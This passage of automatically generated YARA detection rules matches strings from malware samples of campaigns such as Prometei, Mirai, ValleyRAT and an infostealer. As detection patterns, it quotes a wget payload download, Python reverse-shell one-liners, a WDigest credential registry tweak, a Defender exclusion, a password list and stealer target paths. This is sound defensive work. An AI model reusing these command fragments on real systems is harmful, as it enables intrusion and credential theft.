        $s9 = "uction\\x20is\\x20always\\x20atomic,\\x20regardless\\x20of\\x20use\\x20of\\x20the\\x20LOCK\\x20prefix.'" ascii
        $s10 = "0used\\x20with\\x20REPNE\\x20(REPNZ)\\x20prefix.'" ascii
        $s11 = "sed\\x20with\\x20REP\\x20(REPE/REPZ)\\x20prefix.'" ascii
    condition:
        filesize < 4951740 and 12 of them
}

rule Sightlines_imphash_533bfee1_prometei
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-533bfee1"
        date = "2026-11-01"
        campaign = "imphash-533bfee1"
        family = "prometei"
        hash = "260f74d23b51205505f5782e1893d2f16055fb9daab8430920718851127bd17f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-533bfee1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "powershell $f='%s;$o='%s';$data=[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($f)" ascii
        $s1 = ":Option Name=\"WINRS_SKIP_CMD_SHELL\">FALSE</w:Option></w:OptionSet></env:Header><env:Body><rsp:Comman" ascii
        $s2 = "/C reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLog" ascii
        $s3 = "+SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4" wide
        $s4 = "prometeicmd \"wget http://%s/k.php?a=x86_64,%sD -O upnpsetup&&chmod 777 ./upnpsetup\"" ascii
        $s5 = "</w:Selector></w:SelectorSet><w:OptionSet><w:Option Name=\"WINRS_CONSOLEMODE_STDIN\">TRUE</w:Option><w" ascii
        $s6 = ");[io.file]::WriteAllBytes($o,$data);Remove-Item $f;Write-Host (Get-Item $o).length;" ascii
        $s7 = "Content-Type: multipart/encrypted;protocol=\"application/HTTP-SPNEGO-session-encrypted\";boundary=\"Enc" ascii
        $s8 = "d Add-MpPreference -ExclusionPath \"C:\\Windows\\Dell\"" ascii
        $s9 = "|sql2005|abc|abcdefg|Aa12345678|ABCabc123|sqlpassword|sql2008|qwe1234|Lab|servidor@2024|Servidor@202" ascii
        $s10 = "OriginalContent: type=application/soap+xml;charset=UTF-8;Length=" ascii
        $s11 = "Content-Type: application/soap+xml;charset=UTF-8" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_2df0d470_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2df0d470"
        date = "2026-11-01"
        campaign = "tlsh-2df0d470"
        family = ""
        hash = "0ee7a8ed45d3378a0b38151731aed1961a4c78acb660feb2710f852488f2e432"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2df0d470.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "BV5gnH7PdWfK84SSHsFV/0J0b2xBY49RGzCLMcmMAwhqaeN3zEjI6DPLOKIp+c01nZX+lvmTGg3F" ascii
        $s1 = "7CJ9f5YaI6XYMTNste1+V/kSv23O/v8DiB0bXOoXHjpAGVvmFyh4R0PuIncWlV4SZ+Pt5EKIrQVc" ascii
        $s2 = "m7X9bbJ63HYG0eqvOURhXcoJwKNAs2xK/tWbEDfjMG9lVfuPNIa1C1Yiytd8gTreTay5qqqpFdnA" ascii
        $s3 = "l4gKXV71rai1ZNjqQIFA/5V8UzojJ2xDcpeCqnLK6J/zNwRBhaH0mGSdHh4X3eMmEaUl7YMb90+W" ascii
        $s4 = "RMDfkOjgktTck06ZHfszVhdLNBY72EE9/Rlwjqobqu8VsQnaPitmCXAYQXtg6/OI5rFe8G+3An4q" ascii
        $s5 = "8jZgiXQSS6QBUVQGabCuFzfReqYs5MTnpZerFE6EHJlhtuwv+W91aPK+fNKas/Oc3fGk14YqXo8x" ascii
        $s6 = "ThE0qRQuU1mX9oonwOb0dfZily5AqH6PSGkIgMYOlq68/pzzDZWKgbS/JICFyLe+sTTf24BxsX2b" ascii
        $s7 = "PnBMR0GLvjzmcAWlg5EAKmYxUtn1D8Qy96s42ZRJ8CiLMTwfN6bzhrrBowR7OmYX4T5+pFesQ85/" ascii
        $s8 = "ljeC2B4Wu7WyTY0u6fO0wLVIxGFdKn91zDMZs1ivLXiPbQqW1MV2rYtfmAcdoVg8lg/StUXQRktR" ascii
        $s9 = "O9HhsM3u8klwPHWeeqjRyLA55bv3cQwc40ng1XV2eZO16/7YaJDz30+xDgmhR8pwCESAEctFaCBr" ascii
        $s10 = "X7SW2TuYAShsmyGt8kF3sendVz0lvar5YqDpNLK81bCOhId/ibCB9AlVHjUHPnT/vN86XmPoJN2Z" ascii
        $s11 = "XszyVgnjQtEwD4tCrfj8mFcqvs+2CH1orLiOqNfQPB93p1KrnHIdaURzULSeR6ZWhZJ3pYpEM7Sh" ascii
    condition:
        filesize < 24047056 and 12 of them
}

rule Sightlines_tlsh_a48a7394_prometei
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a48a7394"
        date = "2026-11-01"
        campaign = "tlsh-a48a7394"
        family = "prometei"
        hash = "3a69569f3152708d11d38e958094d7041a0ea5d54a50c39447886fccef99c1b5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a48a7394.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Signal CommandId=\"5F0F16A6-39FD-442E-838B-D5197A1BECD7\"><rsp:Code>http://schemas.microsoft.com/wbem/" ascii
        $s1 = "In FIPS mode MD5 is not allowed.Try ssh_get_publickey_hash() withSSH_PUBLICKEY_HASH_SHA256" ascii
        $s2 = "chemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action><w:OptionSet><w:Option Name=\"WINRS_NOPROFILE" ascii
        $s3 = "powershell $f='%s;$o='%s';$data=[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($f)" ascii
        $s4 = "hellId\">95A11240-151C-4382-8E3D-C3F34A856496</w:Selector></w:SelectorSet></env:Header><env:Body><rsp" ascii
        $s5 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s6 = ":Receive><rsp:DesiredStream CommandId=\"690DC335-1B71-4130-93F7-C0810771E5BC\">stdout stderr</rsp:Desi" ascii
        $s7 = "ize><a:MessageID>uuid:b67abbba-03e4-4276-9f60-680e2b8d5770</a:MessageID><w:Locale mustUnderstand=\"fa" ascii
        $s8 = "\">FALSE</w:Option><w:Option Name=\"WINRS_CODEPAGE\">437</w:Option></w:OptionSet></env:Header><env:Body" ascii
        $s9 = "_NISTZ256_ASM -DX25519_ASM -DPOLY1305_ASM -DNDEBUG -Wdate-time -D_FORTIFY_SOURCE=2" ascii
        $s10 = "ize><a:MessageID>uuid:dbc420a3-a7d8-4f02-a80b-97a00e77a931</a:MessageID><w:Locale mustUnderstand=\"fa" ascii
        $s11 = "ellId\">7A2067DB-664B-457D-B941-C9F1D1449CA9</w:Selector></w:SelectorSet></env:Header><env:Body><rsp:" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 8568672 and 12 of them
}

rule Sightlines_tlsh_8c967e59_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8c967e59"
        date = "2026-11-01"
        campaign = "tlsh-8c967e59"
        family = ""
        hash = "704a016be773737cd9612537ca7c287ea55b896d63d90785043a0728fe890886"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8c967e59.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "xtern -mharden-sls=all -mrecord-mcount -mfentry -march=x86-64 -g -gdwarf-5 -O2 -std=gnu11 -p -fshort" ascii
        $s1 = "1 -falign-loops=1 -fno-asynchronous-unwind-tables -fno-jump-tables -fpatchable-function-entry=16,16 " ascii
        $s2 = "-call-used-regs=used-gpr -falign-functions=16 -fstrict-flex-arrays=3 -fno-strict-overflow -fstack-ch" ascii
        $s3 = "preferred-stack-boundary=3 -mskip-rax-setup -mtune=generic -mno-red-zone -mcmodel=kernel -mindirect-" ascii
        $s4 = "/usr/src/linux-headers-6.8.0-142-generic" ascii
        $s5 = "-wchar -funsigned-char -fno-common -fno-PIE -fno-strict-aliasing -fcf-protection=none -falign-jumps=" ascii
        $s6 = "__UNIQUE_ID___addressable_init_module342" ascii
        $s7 = "shift -fsanitize=bool -fsanitize=enum -fstack-protector-strong" ascii
        $s8 = "GNU C11 13.3.0 -mno-sse -mno-mmx -mno-sse2 -mno-3dnow -mno-avx -m64 -mno-80387 -mno-fp-ret-in-387 -m" ascii
        $s9 = "-pointer -fno-optimize-sibling-calls -ftrivial-auto-var-init=zero -fno-stack-clash-protection -fzero" ascii
        $s10 = "__UNIQUE_ID___addressable_cleanup_module343" ascii
        $s11 = "eck=no -fconserve-stack -fno-builtin-wcslen -fno-builtin-wcslen -fsanitize=bounds-strict -fsanitize=" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_d65d27a4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d65d27a4"
        date = "2026-11-01"
        campaign = "tlsh-d65d27a4"
        family = ""
        hash = "8644e30837c543e29155684053c890bc6791aeffb76d5aa896ad2f413f2f8a57"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d65d27a4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect" ascii
        $s1 = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(" ascii
        $s2 = "if command -v python3 > /dev/null 2>&1; then" ascii
        $s3 = "if command -v bash > /dev/null 2>&1; then" ascii
        $s4 = "if command -v python > /dev/null 2>&1; then" ascii
        $s5 = "if command -v perl > /dev/null 2>&1; then" ascii
        $s6 = "if command -v sh > /dev/null 2>&1; then" ascii
        $s7 = "if command -v nc > /dev/null 2>&1; then" ascii
        $s8 = "## https://www.revshells.com/ ##" ascii
        $s9 = "ty; pty.spawn(\"/bin/bash\")'" ascii
        $s10 = "#!/bin/bash" ascii
    condition:
        filesize < 1048576 and 11 of them
}

rule Sightlines_signer_cert_sha1_0420e5b8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-0420e5b8"
        date = "2026-11-01"
        campaign = "signer_cert_sha1-0420e5b8"
        family = ""
        hash = "5b13c58fbf6eb3073f7a906cebc9148609eece5c451324541acfdc8ef6b45f3f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-0420e5b8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Yhttp://www.microsoft.com/pkiops/crl/Microsoft%20Windows%20Code%20Signing%20PCA%202024.crl0w" ascii
        $s1 = "[http://www.microsoft.com/pkiops/certs/Microsoft%20Windows%20Code%20Signing%20PCA%202024.crt0" ascii
        $s2 = "'Microsoft Windows Code Signing PCA 20240" ascii
        $s3 = "Microsoft Corporation100." ascii
        $s4 = "350623220401Z0_1" ascii
        $s5 = "260528185511Z0t1" ascii
        $s6 = "240808213623Z" ascii
        $s7 = "250529185511Z" ascii
        $s8 = "500507+5052770" ascii
        $s9 = "_0Oio=NA" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 9488080 and 10 of them
}

rule Sightlines_tlsh_8dcae7ac_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8dcae7ac"
        date = "2026-11-01"
        campaign = "tlsh-8dcae7ac"
        family = "mirai"
        hash = "4f4abfe2db64294c67144a47ccd28ba63e37602e48d9a241978612d4ffa1d9b9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8dcae7ac.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s2 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s3 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s4 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" ascii
        $s5 = "HOST: 255.255.255.255:1900" ascii
        $s6 = "MAN: \"ssdp:discover\"" ascii
        $s7 = "M-SEARCH * HTTP/1.1" ascii
        $s8 = "service:service-agent" ascii
        $s9 = "/proc/%d/maps" ascii
        $s10 = "objectClass0" ascii
        $s11 = "/proc/%d/exe" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 10 of them
}

rule Sightlines_imphash_16b3ae90_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-16b3ae90"
        date = "2026-11-01"
        campaign = "imphash-16b3ae90"
        family = ""
        hash = "83add24600d6e5ca6681bcb1bd9b2c900af4f80629443f6d4ab7da34740325a5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-16b3ae90.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "1.4.0.1794\" name=\"7-Zip.SfxMod\" type=\"win32\"></assemblyIdentity><dependency><dependentAssembly><asse" ascii
        $s1 = "mblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchit" ascii
        $s2 = "trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutio" ascii
        $s3 = "1.4.0 beta [x86] build 1795 (June 27, 2010)" ascii
        $s4 = "nLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security" ascii
        $s5 = "Copyright (c) 2005-2010 Oleg Scherbakov" ascii
        $s6 = "Sorry, this program requires Microsoft Windows 2000 or later." ascii
        $s7 = "No \"HelpText\" in the configuration file." ascii
        $s8 = "ExtractPathTitle=\"7-ZIP SFX archive\"" ascii
        $s9 = "ExtractPathText=\"Select extraction path\"" ascii
        $s10 = "Could not read SFX configuration or configuration not found." ascii
        $s11 = "7-Zip: Internal error, code 0x%08X." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 36015060 and 12 of them
}

rule Sightlines_imphash_1c5dce8f_aokigaharastealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-1c5dce8f"
        date = "2026-11-01"
        campaign = "imphash-1c5dce8f"
        family = "aokigaharastealer"
        hash = "1370f67acce699e1ac078821d846f70703934ca5c847c17fee444f31d0953483"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-1c5dce8f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6d0da78}\"/><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application></compatibility><" ascii
        $s1 = "%s\\Packages\\OpenAI.ChatGPT-Desktop_2p2nqsd0c76g0\\LocalCache\\Roaming\\ChatGPT" ascii
        $s2 = "ortedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f" ascii
        $s3 = "Software\\Microsoft\\Office\\%s\\Outlook\\Profiles\\%s\\9375CFF0413111d3B88A00104B2A6676" ascii
        $s4 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supportedOS Id=\"{e20" ascii
        $s5 = "11457-1546-43c5-a5fe-008deee3d3f0}\"/><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/><supp" ascii
        $s6 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:as" ascii
        $s7 = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall" ascii
        $s8 = "m.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requested" ascii
        $s9 = "C:\\Program Files (x86)\\Mozilla Thunderbird" ascii
        $s10 = "eyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0" ascii
        $s11 = "SOFTWARE\\Oracle\\VirtualBox Guest Additions" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ed5b872b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ed5b872b"
        date = "2026-11-01"
        campaign = "tlsh-ed5b872b"
        family = ""
        hash = "8f82c3c20a9051b6876612a28cbc353c8ea61532a4e6a343764854ce4d6f2a91"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ed5b872b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "L$TSVWUR" ascii
        $s1 = "D$HkD$0:" ascii
        $s2 = "D$P9D$Lu" ascii
        $s3 = "D$H9D$Du" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 4 of them
}

rule Sightlines_tlsh_665cdde3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-665cdde3"
        date = "2026-11-01"
        campaign = "tlsh-665cdde3"
        family = ""
        hash = "75f0dd780e7b28699c3dd6d37eae03d62d718e5e37463bda6975e4da4d31514d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-665cdde3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "# Required-Stop: $network $remote_fs $syslog" ascii
        $s1 = "# Required-Start: $network $remote_fs $syslog" ascii
        $s2 = "    echo \"Usage: $0 {start|stop|restart}\"" ascii
        $s3 = "# Short-Description: nyx-agent bot" ascii
        $s4 = "# Default-Start: 2 3 4 5" ascii
        $s5 = "# Provides: nyx-agent" ascii
        $s6 = "# Default-Stop: 0 1 6" ascii
        $s7 = "### BEGIN INIT INFO" ascii
        $s8 = "### END INIT INFO" ascii
        $s9 = "  restart)" ascii
        $s10 = "  start)" ascii
    condition:
        filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_da513940_valleyrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-da513940"
        date = "2026-11-01"
        campaign = "tlsh-da513940"
        family = "valleyrat"
        hash = "31b85afeddc802902ff1a33325f72dad1f99c5ee8664bd8f457d92352da81c79"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-da513940.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "2.TList`1.Pack[0]$0$Intf<System.Classes.TPropFixup>`3@" ascii
        $s1 = "2.TList`1.Pack[1]$0$Intf<System.Classes.TPropFixup>`3@" ascii
        $s2 = "1.TList`1.Pack[0]$0$Intf<System.Classes.TRegGroup>`3@" ascii
        $s3 = "1.TList`1.Pack[1]$0$Intf<System.Classes.TRegGroup>`3@" ascii
        $s4 = "2@TList`1.Pack[1]$ActRec<System.Classes.TPropFixup> " ascii
        $s5 = "D.TList`1.Pack[0]$0$Intf<System.Rtti.TMethodImplementation.TParamLoc>`3@" ascii
        $s6 = "D.TList`1.Pack[1]$0$Intf<System.Rtti.TMethodImplementation.TParamLoc>`3@" ascii
        $s7 = "1@TList`1.Pack[0]$ActRec<System.Classes.TRegGroup>0" ascii
        $s8 = "'.TList`1.Pack[0]$0$Intf<System.TObject>`3@" ascii
        $s9 = "'.TList`1.Pack[1]$0$Intf<System.TObject>`3@" ascii
        $s10 = "6.TList`1.Pack[1]$0$Intf<System.Rtti.TRttiManagedField>`3@" ascii
        $s11 = "6.TList`1.Pack[0]$0$Intf<System.Rtti.TRttiManagedField>`3@" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3437568 and 12 of them
}

rule Sightlines_imphash_c165af9d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-c165af9d"
        date = "2026-11-01"
        campaign = "imphash-c165af9d"
        family = ""
        hash = "10062101e1bfdf17c465f4354e75b5d21b529fbe9ab9b777a05c70dc5703f0ed"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-c165af9d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s1 = "Copyright 2026 Google LLC. All rights reserved." wide
        $s2 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s3 = "\"C:\\Windows\\System32\\nvidia-smi.exe\"" wide
        $s4 = "Partial loss of significance (PLOSS)" ascii
        $s5 = "Total loss of significance (TLOSS)" ascii
        $s6 = "Overflow range error (OVERFLOW)" ascii
        $s7 = "Argument domain error (DOMAIN)" ascii
        $s8 = "Argument singularity (SIGN)" ascii
        $s9 = "Chrome GPU Monitor (x86)" wide
        $s10 = "8MZuCHcP<H" ascii
        $s11 = "__initenv" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_c189a697_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c189a697"
        date = "2026-11-01"
        campaign = "tlsh-c189a697"
        family = ""
        hash = "2282d0a32e82ea90bc714977a14a1bf24eaccdf35443cd5db4991899713d8248"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c189a697.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion" wide
        $s1 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s2 = "Copyright 2026 Google LLC. All rights reserved." wide
        $s3 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s4 = "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment" wide
        $s5 = "Partial loss of significance (PLOSS)" ascii
        $s6 = "User-Agent: Chrome/131.0.6778.109" wide
        $s7 = "Total loss of significance (TLOSS)" ascii
        $s8 = "Overflow range error (OVERFLOW)" ascii
        $s9 = "Argument domain error (DOMAIN)" ascii
        $s10 = "Argument singularity (SIGN)" ascii
        $s11 = "SOFTWARE\\Google\\Update\\" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1e93a85a_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1e93a85a"
        date = "2026-10-30"
        campaign = "tlsh-1e93a85a"
        family = "connectwise"
        hash = "46b5e5360b677c411999085a3efadc20637254ffcdb190477dce690116dee907"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1e93a85a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "24?69<>BNPREDHKMY_aTVX[]dftsihlnprvw$&($&(|{" wide
        $s1 = "394821E67B}NOT EXCLUDE_BACKSTAGE_SHELLScreenConnect.WindowsBackstageShell.exeFileManagerFiles{80C42F" ascii
        $s2 = "E1-27A8-4EB1-896F-161D3237D864}NOT EXCLUDE_FILE_MANAGERScreenConnect.WindowsFileManager.exeServiceFi" ascii
        $s3 = "B6E27BUseOriginalUrlEncoding#1regED314AE69CE5D835D523FB365C82C36B[URL_SCHEME]\\shell\\open\\command\"[IN" ascii
        $s4 = "ationPackage.dllCredentialProviderFiles{595C1B10-5F3C-42F7-B006-5D9C44DEC4FF}NOT EXCLUDE_CREDENTIAL_" ascii
        $s5 = "TNetFramework40ClientCustomActionLibraryWixCAMainFiles{E0EF5F66-7B92-40DE-8B20-EB91E1C859BB}INSTALLL" ascii
        $s6 = "ntVersion\\Authentication\\Credential Providers\\[CREDENTIAL_PROVIDER_CLASS_ID]reg685500C4A1A36BBDF1BB3" ascii
        $s7 = "ll]reg86A6324C5FADB6CB634CB54F9A254136CLSID\\[CREDENTIAL_PROVIDER_CLASS_ID][ProductName] Credential P" ascii
        $s8 = "OCATIONNOT EXCLUDE_MAINScreenConnect.ClientService.dllBackstageShellFiles{DDCF1E82-0B14-4C68-A063-33" ascii
        $s9 = "2EEE98CBEDESoftware\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727InstallSOFTWARE\\Microsoft\\NET Framew" ascii
        $s10 = "STALLLOCATION]ScreenConnect.WindowsClient.exe\" \"%1\"reg3831C0C36D9CE44BC3E6FAE6F161BEA8System\\Current" ascii
        $s11 = "H_PARAMETERS AND %PROCESSOR_ARCHITECTURE <> \"x86\" AND VersionNT >= 601ScreenConnect.WindowsAuthentic" ascii
    condition:
        filesize < 27713536 and 12 of them
}

rule Sightlines_signer_cert_sha1_10b07153_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-10b07153"
        date = "2026-10-30"
        campaign = "signer_cert_sha1-10b07153"
        family = "connectwise"
        hash = "011d644427a002eedf5c19869b57f1b92823cef87660e3b3a2b74cc884233bbf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-10b07153.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Connectwise, LLC0" ascii
        $s1 = "Connectwise, LLC1" ascii
        $s2 = "250815235959Z0e1" ascii
        $s3 = "351125235959Z0B1" ascii
        $s4 = "220817000000Z" ascii
        $s5 = "240926000000Z" ascii
        $s6 = "Florida1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 14933760 and 7 of them
}

rule Sightlines_imphash_bd42f490_valleyrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-bd42f490"
        date = "2026-10-31"
        campaign = "imphash-bd42f490"
        family = "valleyrat"
        hash = "116a7bbe25ff2bb79a7775abcad3082acf7ba67ecee9d418c639bd74cc9a6d04"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-bd42f490.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "_PYI_APPLICATION_HOME_DIR environment variable is not defined!" ascii
        $s1 = "Failed to set _PYI_PARENT_PROCESS_LEVEL environment variable!" ascii
        $s2 = " inflate 1.3.2 Copyright 1995-2026 Mark Adler " ascii
        $s3 = "Security descriptor string length exceeds PYI_PATH_MAX!" wide
        $s4 = "Could not allocate memory for SPLASH_CONTEXT." ascii
        $s5 = "SPLASH: length of Tk shared library path exceeds maximum path length!" ascii
        $s6 = "Invalid value in _PYI_PARENT_PROCESS_LEVEL: %s" ascii
        $s7 = "SPLASH: length of Tk module directory path exceeds maximum path length!" ascii
        $s8 = "Could not allocate memory for DYLIB_PYTHON structure." ascii
        $s9 = "SPLASH: length of Tcl shared library path exceeds maximum path length!" ascii
        $s10 = "SPLASH: length of Tcl module directory path exceeds maximum path length!" ascii
        $s11 = "Could not side-load PyInstaller's PKG archive from external file (%s)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 40678486 and 12 of them
}

rule Sightlines_c2_18546e14_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-18546e14"
        date = "2026-10-26"
        campaign = "c2-18546e14"
        family = "mirai"
        hash = "192604729aada8ede20a961fb125e2acb62f692413177754baf7068a3e654412"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-18546e14.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Fbi5sy8EgLy+wUMDd15mGNMbHZZWPoU/N8xnYxLz2FAyMjeFW6IGKDa610AbQeEVPDVloZPsfxz4uu/7iDqmwP9OvTV2gzRE4PYQ" ascii
        $s1 = "ziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg" ascii
        $s2 = "qmC6u074sckgPERhS6c4135wEdNP+6bONEDzxYCuJI+E99nie4UJSXkHNeE8Y62ltzBB45bo+7cqhziJW/f9kbarbtb/FRibYGLZ" ascii
        $s3 = "2uTnWe1DhnMvetK4RW+OZ5ktObmrgEGuu82OUP/7OEtlpL9PkqL9ZeZ8ZbWbUc+PeGu6dvIdjsSBdvHxA+VulDm3AkKsVYTJQZ/d" ascii
        $s4 = "QC/aWFGdjOvBEes5AHBbcrw29SyQ+1x0rpoVxz9gaN2tVYZfmg7UtxqdGWNXIlsv" ascii
        $s5 = "+qcDsiMFnUSLDrl2K2m7+8rTyccPlqzWJ5bT+FEx3pK70cqj4tnOVzDvSKFXYqSgwt5bF1HWZYpeILz6F82AEPwOm2GG2p7HgqEA" ascii
        $s6 = "KAwsHY0QYzpMqFUm90Yg+LNEWY/dGfnVclVijGeFtgLsIAUZ1LzP/q4kyhxruvLB" ascii
        $s7 = "Acwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx" ascii
        $s8 = "OizZiN51Z3k6j5xTNlO2yD22KUIrl7UKTGxFgT2IDft6bJfaipUwNrehHR2ugoJzFwVhtiZTPKnBnv1Lv880s2Gin7sSwnrUJVOO" ascii
        $s9 = "yQIg+1tCppMZumIXp5EV1z14wZLS9eHThRtPYJ7iYYMVr4gKK478aLIhY4WJlirBByBKU26o2liJ1KKnR+WErV2KK0Q2M6dSC/wW" ascii
        $s10 = "IDQ1cyAmJiBwa2lsbCAtOSBydW4gJiYgcGtpbGwgLTkgdG9wICYmIHBraWxsIC05IGt0aHJlYWRhZGQKZXhpdCAw\" | base64 -" ascii
